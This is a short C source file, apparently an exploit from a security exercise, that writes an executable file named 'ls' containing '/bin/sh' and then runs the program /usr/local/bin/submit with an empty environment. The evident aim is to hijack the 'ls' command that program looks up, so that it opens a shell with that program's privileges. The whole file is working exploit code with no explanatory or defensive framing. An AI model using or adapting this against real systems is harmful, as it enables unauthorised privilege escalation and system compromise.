#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void) {
  char *args[4], *env[1];
  FILE *f;

  f = fopen("ls", "w");
  fprintf(f, "/bin/sh\n");
  fclose(f);

  chmod("ls", S_IRWXU | S_IRWXG | S_IRWXO);

  args[0] = "/usr/local/bin/submit";
  args[1] = "f";
  args[2] = "m";
  args[3] = NULL;

  env[0] = NULL;

  return execve("/usr/local/bin/submit", args, env);
}

